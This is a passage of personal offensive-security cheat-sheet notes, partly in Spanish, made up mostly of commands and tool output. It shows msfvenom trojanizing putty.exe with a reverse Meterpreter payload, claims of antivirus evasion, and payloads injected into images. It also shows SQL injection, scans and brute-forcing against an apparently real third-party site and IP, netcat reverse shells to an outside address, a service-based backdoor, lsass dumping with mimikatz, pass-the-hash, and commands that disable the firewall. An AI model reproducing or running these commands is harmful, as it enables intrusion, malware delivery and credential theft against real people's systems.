    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of exe file: 73802 bytes
    > ls example.exe
    example.exe

    # run this command to see output formats...
    > msfvenom --list formats

    # I can create a custom version of whatever exe file, in this case, putty.exe

    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe -x /home/kali/Downloads/putty.exe -o putty-fake.exe
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of exe file: 1449256 bytes
    Saved as: putty-fake.exe
    > ls -tatlh putty-fake.exe
    -rw-r--r-- 1 kali kali 1.4M Jul  1 13:37 putty-fake.exe

    > sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f RAW > trojan.py

    That trojan.py is detectable by virustotal, but if i use pyinstaller...

    > sudo pyinstaller —one-file trojan.py

    It will generate a folder named dist with the trojan. Undetectable by VirusTotal.

    > pwd
    /home/kali/test-trojan
    > ls
    build  dist  —one-file.spec  trojan.py  trojan.spec
    > ls -ltah dist
    total 6.4M
    drwxr-xr-x 2 root root 4.0K Sep  8 12:51 .
    -rwxr-xr-x 1 root root 6.4M Sep  8 12:51 trojan
    drwxr-xr-x 4 kali kali 4.0K Sep  8 12:51 ..

    ⭐  ~/test-trojan  ok  at 13:01:44 >

    https://github.com/chinarulezzz/pixload

    > sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.85.139 LPORT=1234 -f RAW > trojan.py
    [-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
    [-] No arch selected, selecting arch: python from the payload
    No encoder specified, outputting raw payload
    Payload size: 116953 bytes

    > /usr/local/bin/pixload-bmp --payload "$(cat troyan.py)" troyan.png
    cat: troyan.py: No such file or directory
    ......... BMP Payload Creator/Injector ........
    ...............................................
    ... https://github.com/chinarulezzz/pixload ...
    ...............................................

    [>] Generating output file
    [✔] File saved to: troyan.png

    [>] Injecting payload into troyan.png
    [✔] Payload was injected successfully

    troyan.png: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26

    00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
    00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
    00000020  3d 31 3b 3b                                       |=1;;|
    00000024

    > ls
    config.mk   Makefile       pixload-bmp.1.pod  pixload-gif.1      pixload-jpg        pixload-jpg.in  pixload-png.1.pod  pixload-webp.1      README.md
    Dockerfile  pixload-bmp    pixload-bmp.in     pixload-gif.1.pod  pixload-jpg.1      pixload-png     pixload-png.in     pixload-webp.1.pod  trojan.py
    LICENSE     pixload-bmp.1  pixload-gif        pixload-gif.in     pixload-jpg.1.pod  pixload-png.1   pixload-webp       pixload-webp.in     troyan.png
    > pwd
    /home/kali/pixload

     ⭐  ~/pixload  ok  at 16:29:27 >

    3) pesidious -> weird, now i cannot run it...  https://github.com/CyberForce/Pesidious/issues/8

    https://kalilinuxtutorials.com/pesidious/

    quick install commands.

    > conda create -n py36 python=3.6 ipykernel
    > conda activate py36
    > python --version
    Python 3.6.13 :: Anaconda, Inc.
    > pip install pip==8.1.1
    > pip install -r pip_requirements/requirements.txt
    python classifier.py -d /path/to/directory/with/malware/files
    python mutate.py -d /path/to/directory/with/malware/files

    4) armitage

    Web interface for metasploit

    quick commands:

        msfdb init
        armitage

    https://localhost:5443/api/v1/auth/account

    https://www.dragonjar.org/manual-de-armitage-en-espanol.xhtml

    https://www.kali.org/tools/armitage/

# How to hide a backdoor in a jpeg file

    https://github.com/r00t-3xp10it/FakeImageExploiter

# Exploitation and hacking of websites -> You have to see this again.

    1) Burp Suite ->

    2) SQLInjection

    3) inyeccion de código

    4) sqlMap

    Use Burp Suite to generate a txt file with POST request, then run this command:

    sqlmap -r post-petition.txt -p username -p password

    https://hackertarget.com/sqlmap-post-request-injection/

    https://hackertarget.com/sqlmap-tutorial/

    After some minutes, you have this:

    ...
    POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
    sqlmap identified the following injection point(s) with a total of 504 HTTP(s) requests:
    ---
    Parameter: password (POST)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' OR NOT 4956=4956#

        Type: error-based
        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND GTID_SUBSET(CONCAT(0x71706a7871,(SELECT (ELT(1193=1193,1))),0x7178707871),1193)-- pBsa

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND (SELECT 7242 FROM (SELECT(SLEEP(5)))dLML)-- bxut
    ---
    [17:33:50] [INFO] the back-end DBMS is MySQL
    [17:33:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    web server operating system: Linux Debian
    web application technology: Apache 2.4.51, PHP 5.6.40
    back-end DBMS: MySQL >= 5.6
    [17:33:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/www.northernrich.com'


    5) path Traversal

    6) webshells

    7) file upload

    8) html injection y XSS

    9) CSRF

    10) XSstrike

    11) Cookie tampering, command injection

# Exploitation and hacking of network vulnerabilities

    1) MITM

    2) Bettercap

        This is basically a sniffer. You can use it to perform MITM attacks.

        https://www.kali.org/tools/bettercap/

        https://www.bettercap.org/usage/webui/

        # first steps!
        1) edit this file:

            /usr/local/share/bettercap/caplets/http-ui.cap

        2) you must see something like this:

            # api listening on http://127.0.0.1:8081/ and ui to http://127.0.0.1
            set api.rest.address 127.0.0.1
            set api.rest.port 8081
            set http.server.address 127.0.0.1
            set http.server.port 80
            # default installation path of the ui
            set http.server.path /usr/local/share/bettercap/ui

            # !!! CHANGE THESE !!!
            set api.rest.username user
            set api.rest.password pass

            # go!
            api.rest on
            http.server on
        3) run the next command:

        > sudo bettercap -caplet http-ui
        bettercap v2.32.0 (built for linux amd64 with go1.17.6) [type 'help' for a list of commands]

        [13:14:24] [sys.log] [inf] gateway monitor started ...
        192.168.85.0/24 > 192.168.85.139  » [13:14:24] [sys.log] [inf] http.server starting on http://127.0.0.1:80
        192.168.85.0/24 > 192.168.85.139  » [13:14:24] [sys.log] [inf] api.rest api server starting on http://127.0.0.1:8081
        192.168.85.0/24 > 192.168.85.139  »  

        4) go to the browser and put this url, 127.0.0.1, the same you put in http.server.address
        in /usr/local/share/bettercap/caplets/http-ui.cap file

        in progress

    3) ARP Spoofing

        > sudo arp-scan -l
        [sudo] password for kali:
        Interface: eth0, type: EN10MB, MAC: 00:0c:29:71:36:92, IPv4: 192.168.85.139
        Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
        192.168.85.1    a6:83:e7:39:c4:65       (Unknown: locally administered)
        192.168.85.2    00:50:56:e5:34:24       VMware, Inc.
        192.168.85.254  00:50:56:fb:49:d6       VMware, Inc.

        3 packets received by filter, 0 packets dropped by kernel
        Ending arp-scan 1.9.7: 256 hosts scanned in 1.980 seconds (129.29 hosts/sec). 3 responded

         ⭐  ~  ok  took 5s  at 17:54:09 >

         Bettercap

         > sudo bettercap -caplet http-ui
        bettercap v2.32.0 (built for linux amd64 with go1.17.6) [type 'help' for a list of commands]

        [17:56:03] [sys.log] [inf] gateway monitor started ...
        [17:56:03] [sys.log] [inf] api.rest api server starting on http://127.0.0.1:8081
        192.168.85.0/24 > 192.168.85.139  » [17:56:03] [sys.log] [inf] http.server starting on http://127.0.0.1:80
        192.168.85.0/24 > 192.168.85.139  »


    4) DNS Spoofing

    5) Social engineering toolkit

        https://github.com/trustedsec/social-engineer-toolkit

    6) Polymorph. Manipulation of network traffic in real time and programmable. Black magic!

       Polymorph is a tool that facilitates the modification of network traffic on the fly by
       allowing the execution of Python code on network packets that are intercepted in real time.

       This framework can be used to modify in real time network packets that implement any publicly
       specified network protocol.

       Additionally, it can be used to modify privately specified network protocols by creating custom
       abstractions and fields.

        https://github.com/shramos/polymorph

# Post-exploitation techniques

    1) meterpreter en metasploit

    2) Mimicatz

    3) UAC bypass

    4) procdump y lsass.exe

    5) backdoors en binarios con msfvenom

    6) Password cracking in hashed form with John the ripper and hashcat

    7) session migration using the backdoor.

# Machine learning applied to cybersecurity

    1) Batting, reconnaissance of hosts based on their impact

    2) pesidous, mutating backdoors using the one created by msfVenom.

    3) Deep fakes.

# Mitre&Attck

# Decompiling techniques (black magic)

    GHidra -> in Kali
    IDA -> /opt/idafree-7.7 ./ida64

# Apply the best nmap scanning strategy for all size networks

# Host discovery, generate a list of surviving hosts

    cd /home/kali/Desktop/work
    sudo nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
    grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt

    #http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf

    sudo nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
    sudo nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt

# Port found, found all the ports, but UDP port scanning will be very slow

    sudo nmap -sS -T4 -Pn –top-ports 3674 -oG LiveHost-port-3674 -iL LiveHosts.txt
    sudo nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
    # este comando es super lento...
    sudo nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# Displays the TCP / UDP port

    grep "open" FullTCP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "TCP-PORTS: " $0}'
    grep "open" FullUDP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "UDP-PORTS: " $0}'

# Detect the service version

    sudo nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
    sudo nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
    sudo nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
    # Este comando hace un TCP y UDP scan, udp ports 53,111,137. tcp ports 21-25,80,139,8080. El anterior hace lo mismo pero da warnings.
    sudo nmap -O -sV -sS -sU -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt

# Nmap to avoid the firewall

# Segmentation
    nmap -f
# Modify the default MTU size, but it must be a multiple of 8 (8, 16, 24, 32, etc.)
    nmap –mtu 24
# Generate random numbers of spoofing
    nmap -D RND:10 [target]
# Manually specify the IP to be spoofed
    nmap -D decoy1,decoy2,decoy3 etc.
# Botnet scanning, first need to find the botnet IP
    nmap -sI [Zombie IP] [Target IP]
# Designated source terminal
    nmap –source-port 80 IP
# Add a random number of data after each scan
    nmap –data-length 25 IP
# MAC address spoofing, you can generate different host MAC address
    nmap –spoof-mac Dell/Apple/3Com IP

# Nmap for Web vulnerability scanning

    cd /usr/share/nmap/scripts/
    wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site www.northernrich.com
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-1 --script-args vulscandb=scipvuldb.csv www.northernrich.com
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-port80 --script-args vulscandb=scipvuldb.csv -p80 www.northernrich.com
    sudo nmap -PN -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-vulscancorrelation-1 --script-args vulscancorrelation=1 -p80 www.northernrich.com
    sudo nmap -sV -oG northernrich-vulscan-site-script-vuln --script=vuln www.northernrich.com
    sudo nmap -PN -sS -sV -oG northernrich-vulscan-site-script-all --script=all --script-args vulscancorrelation=1 www.northernrich.com

# Web path scanner
    dirsearch ->

    designed to brute force directories and files in webservers.

    As a feature-rich tool, dirsearch gives users the opportunity to perform a complex web content discovering, with many vectors for the wordlist, high     accuracy, impressive performance, advanced connection/request settings, modern brute-force techniques and nice output.

    https://www.kali.org/tools/dirsearch/

    > python --version
    Python 3.9.12
    > dirsearch --url=https://www.northernrich.com/en/ --wordlists /usr/share/seclists/Discovery/Web-Content/dirsearch.txt

      _|. _ _  _  _  _ _|_    v0.4.2
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29583

    Output File: /home/kali/.dirsearch/reports/www.northernrich.com/-en-_22-07-04_18-42-46.txt

    Error Log: /home/kali/.dirsearch/logs/errors-22-07-04_18-42-46.log

    Target: https://www.northernrich.com/en/

    [18:42:47] Starting:
    [18:42:59] 403 -    2KB - /en/.php                                         
    [18:42:59] 200 -   19KB - /en/.                                            
    [18:42:59] 403 -    2KB - /en/.html                                        
    [18:43:12] 403 -    2KB - /en/.htaccess.bak1                               
    [18:43:13] 403 -    2KB - /en/.htaccess.orig                               
    [18:43:13] 403 -    2KB - /en/.htaccess.save
    [18:43:13] 403 -    2KB - /en/.htaccessBAK
    [18:43:13] 403 -    2KB - /en/.htm
    [18:43:13] 403 -    2KB - /en/.htaccessOLD                                 
    [18:43:13] 403 -    2KB - /en/.httr-oauth
    [18:43:13] 403 -    2KB - /en/.htaccess.sample                             
    [18:43:14] 403 -    2KB - /en/.htaccessOLD2                                
    [18:43:21] 403 -    2KB - /en/.php3                                        
    [18:51:45] 200 -   19KB - /en/index.html                                    
    [18:56:05] 200 -   36KB - /en/register.php                                  

    Task Completed

    DirBuster -> Like above, but with a gui

    https://www.kali.org/tools/dirbuster/#dirbuster-1

    Patator- password guessing attacks

    git clone https://github.com/lanjelot/patator.git /usr/share/patator
    #Probably you will have available the tool in kali...
    # Passwords and users from SecList. /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt

    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt host=150.107.31.61 -x ignore:fgrep='Access denied for user'
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/john/password.lst host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
    sudo patator smtp_login host=150.107.31.61 user=Ololena password=FILE0 0=/usr/share/john/password.lst
    sudo patator smtp_login host=150.107.31.61 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    sudo patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    sudo patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’

# Use Fierce to brute DNS

# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo. Pendiente!

    # http://ha.ckers.org/fierce/
    https://github.com/mschwager/fierce

    ./fierce.pl -dns example.com
    ./fierce.pl –dns example.com –wordlist myWordList.txt

# Use Nikto to scan Web services

    nikto -C all -h http://IP
    nikto -C all -h 150.107.31.61

    > nikto -C all -h https://www.northernrich.com/en/
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          150.107.31.61
    + Target Hostname:    www.northernrich.com
    + Target Port:        443
    ---------------------------------------------------------------------------
    + SSL Info:        Subject:  /CN=northernrich.com
                       Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                       Issuer:   /C=US/O=Let's Encrypt/CN=R3
    + Start Time:         2022-07-04 18:57:36 (GMT2)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.51 (Debian)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect aga
    + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + The site uses SSL and Expect-CT header is not present.
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the conte
    + Retrieved x-powered-by header: PHP/5.6.40-0+deb8u12
    + Hostname 'www.northernrich.com' does not match certificate's names: northernrich.com
    + ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection refused at /var/lib/nikto/plugins/LW2.pm line 5157.
    : Connection refused
    + SCAN TERMINATED:  20 error(s) and 7 item(s) reported on remote host
    + End Time:           2022-07-04 19:08:02 (GMT2) (626 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) teste

# WordPress scan Está en kali por defecto.
    git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
    ./wpscan --url https://www.northernrich.com/en/ –enumerate p

# HTTP fingerprint identification

    wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
    cd httprint_301/linux/
    ./httprint -h http://IP -s signatures.txt

    https://www.kali.org/tools/httprint/#httprint-1

# Scan with dirb

    Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt)

    > dirb https://www.northernrich.com /usr/share/dirb/wordlists/common.txt

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Mon Jul  4 19:09:50 2022
    URL_BASE: https://www.northernrich.com/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: https://www.northernrich.com/ ----
    ==> DIRECTORY: https://www.northernrich.com/admin/                                                
    ==> DIRECTORY: https://www.northernrich.com/api/                                                  
    ==> DIRECTORY: https://www.northernrich.com/assets/                                               
    ==> DIRECTORY: https://www.northernrich.com/backup/                                               
    --> Testing: https://www.northernrich.com/emoticons                                               
    --> Testing: https://www.northernrich.com/employee         
    ...

# Scan with Skipfish

# Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.

    skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP

    https://www.kali.org/tools/skipfish/#skipfish-1

    > skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o skipfish-northern -u https://www.northernrich.com/en/
    skipfish web application scanner - version 2.10b
    [*] Scan in progress, please stay tuned...

    [+] Copying static resources...                                                                                                                                                                           
    [+] Sorting and annotating crawl nodes: 19                                                                                                                                                                
    [+] Looking for duplicate entries: 19                                                                                                                                                                     
    [+] Counting unique nodes: 12                                                                                                                                                                             
    [+] Saving pivot data for third-party tools...                                                                                                                                                            
    [+] Writing scan description...                                                                                                                                                                           
    [+] Writing crawl tree: 19                                                                                                                                                                                
    [+] Generating summary views...                                                                                                                                                                           
    [+] Report saved to 'skipfish-northern/index.html' [0x1e08a1da].                                                                                                                                          
    [+] This was a great day for science!   

# Use the NC scan

    nc -v -w 1 target -z 1-1000
    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

# Unicornscan

# NOTE: Unicornscan is a tool for information gathering and security audits. como si hicieras nmap -p- --open

    https://www.kali.org/tools/unicornscan/

    sudo us -mTsf -Iv -r 1000 150.107.31.61:a

    sudo us -H -msf -Iv 150.107.31.61 -p 1-65535
    ...
    listener statistics 136150 packets recieved 0 packets droped and 0 interface drops
    TCP open                     ftp[   21]         from ns21.appservhosting.com  ttl 128
    TCP open                     ssh[   22]         from ns21.appservhosting.com  ttl 128
    TCP open                    smtp[   25]         from ns21.appservhosting.com  ttl 128
    TCP open                  domain[   53]         from ns21.appservhosting.com  ttl 128
    TCP open                    http[   80]         from ns21.appservhosting.com  ttl 128
    TCP open                    pop3[  110]         from ns21.appservhosting.com  ttl 128
    TCP open                  sunrpc[  111]         from ns21.appservhosting.com  ttl 128
    TCP open                    imap[  143]         from ns21.appservhosting.com  ttl 128
    TCP open                   https[  443]         from ns21.appservhosting.com  ttl 128
    TCP open                     urd[  465]         from ns21.appservhosting.com  ttl 128
    TCP open              submission[  587]         from ns21.appservhosting.com  ttl 128
    TCP open                    ftps[  990]         from ns21.appservhosting.com  ttl 128
    TCP open                   imaps[  993]         from ns21.appservhosting.com  ttl 128
    TCP open                   pop3s[  995]         from ns21.appservhosting.com  ttl 128
    TCP open                servexec[ 2021]         from ns21.appservhosting.com  ttl 128
    TCP open                    down[ 2022]         from ns21.appservhosting.com  ttl 128
    TCP open           scientia-ssdb[ 2121]         from ns21.appservhosting.com  ttl 128

    > sudo us -H -mU -Iv 150.107.31.61 -p 1-65535
    adding 150.107.31.61/32 mode `UDPscan' ports `1-65535' pps 300
    using interface(s) eth0
    scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
    UDP open 192.168.1.49:56700  ttl 128
    UDP open 192.168.85.2:53  ttl 128
    sender statistics 298.6 pps with 65544 packets sent total
    listener statistics 80 packets recieved 0 packets droped and 0 interface drops
    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
    UDP open                  domain[   53]         from 192.168.85.2  ttl 128
    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
    UDP open                 unknown[56700]         from 192.168.1.49  ttl 128

# Use Xprobe2 to identify the operating system fingerprint

    A Remote active operating system fingerprinting tool.

    sudo xprobe2  -v -r -p tcp:80:open 150.107.31.61

    I can generate a signature.txt file, maybe you can use it with httprint.

    sudo xprobe2  -v -r  -F -o /home/kali/Desktop/signature-northernrich.txt  -p tcp:443:open -p tcp:80:open -B 150.107.31.61


    Enumeration of Samba

    nmblookup -A target
    smbclient //MOUNT/share -I target -N
    rpcclient -U “” target
    enum4linux target

# Enumerates SNMP

    snmpget -v 1 -c public IP
    snmpwalk -v 1 -c public IP
    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

# Useful Windows cmd command

    net localgroup Users
    net localgroup Administrators
    search dir/s *.doc
    system(“start cmd.exe /k $cmd”)
    sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore
    /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
    mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
    Procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
    C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
    C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64

# PuTTY connects the tunnel

    Forward the remote port to the destination address
    plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 IP

# Meterpreter port forwarding

    https://www.offensive-security.com/metasploit-unleashed/portfwd/

# Forward the remote port to the destination address
    meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
    kali > rdesktop 127.0.0.1:3389

# Enable the RDP service

    reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
    netsh firewall set service remoteadmin enable
    netsh firewall set service remotedesktop enable

# Close Windows Firewall
    netsh firewall set opmode disable

Meterpreter VNC/RDP

    https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
    run getgui -u admin -p 1234
    run vnc -p 5043

# Use Mimikatz

    Gets the Windows plaintext user name password

    git clone https://github.com/gentilkiwi/mimikatz.git
    mimikatz privilege::debug
    mimikatz sekurlsa::logonPasswords full

Gets a hash value

    git clone https://github.com/byt3bl33d3r/pth-toolkit
    pth-winexe -U hash //IP cmd

    or

    apt-get install freerdp-x11
    xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

    or

    meterpreter > run post/windows/gather/hashdump
    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
    msf exploit(psexec) > exploit
    meterpreter > shell

# Use Hashcat to crack passwords    

    hashcat -m 400 -a 0 hash /root/rockyou.txt

    https://www.securityartwork.es/2017/02/15/cracking-contrasenas-hashcat/

    https://sniferl4bs.com/showcase/


# Use the NC to fetch Banner information

    nc 150.107.31.61 80
    GET / HTTP/1.1
    Host: 192.168.0.10
    User-Agent: Mozilla/4.0
    Referrer: www.example.com
    <enter>
    <enter>


# Use NC to bounce the shell on Windows

    c:>nc -Lp 31337 -vv -e cmd.exe
    nc 192.168.0.10 31337
    c:>nc example.com 80 -e cmd.exe
    nc -lp 80

    nc -lp 31337 -e /bin/bash
    nc 192.168.0.10 31337
    nc -vv -r(random) -w(wait) 1 150.107.31.61 -z(i/o error) 1-1000

# Look for the SUID/SGID root file

# Locate the SUID root file

    sudo find / -user root -perm -4000 -print

# Locate the SGID root file:

    sudo find / -group root -perm -2000 -print

# Locate the SUID and SGID files:

    sudo find / -perm -4000 -o -perm -2000 -print

# Find files that do not belong to any user:

    sudo find / -nouser -print

# Locate a file that does not belong to any user group:

    sudo find / -nogroup -print

# Find soft links and point to:

    find / -type l -ls

# Python shell

    python -c ‘import pty;pty.spawn(“/bin/bash”)’

# Python \ Ruby \ PHP HTTP server

    python2 -m SimpleHTTPServer
    # create a http server in that folder, port 8000 by default
    python3 -m http.server
    # create a http server in that folder, port 80
    python3 -m http.server 80
    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, DocumentRoot => Dir.pwd).start”
    php -S 0.0.0.0:8888

# Gets the PID corresponding to the process

    fuser -nv tcp 80
    fuser -k -n tcp 80

# Use Hydra to crack RDP

    hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp

    xhydra is the gtk gui

# Mount the remote Windows shared folder

    smbmount //X.X.X.X/c/mnt/remote/ -o username=user,password=pass,rw

# Under Kali compile Exploit

    gcc -m32 -o output32 hello.c
    gcc -m64 -o output hello.c

# Compile Windows Exploit under Kali

    wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
    wine mingw-get-setup.exe
    select mingw32-base
    Installation/ Apply changes

    cd /home/kali/.wine/drive_c/windows

    cd /home/kali/.wine/drive_c/MinGW/bin

    wine gcc -o ability.exe /tmp/exploit.c -lwsock32
    wine ability.exe

# NASM command

    Note: NASM, the Netwide Assembler, is a 80 x86 and x86-64 platform based on the assembly language compiler, designed to achieve the compiler program cross-platform and modular features.

    nasm -f bin -o payload.bin payload.asm
    nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

# SSH penetration

    ssh -D 127.0.0.1:1080 -p 22 user@IP
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains commands target
    SSH penetrates from one network to another

    ssh -D 127.0.0.1:1080 -p 22 user1@IP1
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
    Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
    proxychains commands target

# Use metasploit for penetration

    TODO


